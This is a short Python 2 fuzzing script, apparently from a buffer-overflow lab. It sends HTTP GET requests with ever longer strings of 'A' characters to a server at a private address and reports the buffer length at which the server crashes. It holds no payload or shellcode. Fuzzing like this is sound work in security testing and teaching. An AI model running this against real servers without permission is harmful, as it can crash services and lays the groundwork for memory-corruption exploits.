#!/usr/bin/python
import socket
import os
import sys

buff = "A" * 100

while True: 
        try: 
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect(('192.168.0.134',80))
             print "Trying with buffer length %d" % len(buff)
             s.send(("GET " + buff + " HTTP/1.0\r\n\r\n"))
             s.recv(1024)
             s.close()
           
             buff=buff + "A"*100


        except: 
                print("Fuzzing Crashed at %s by" % str(len(buff)))
                sys.exit()     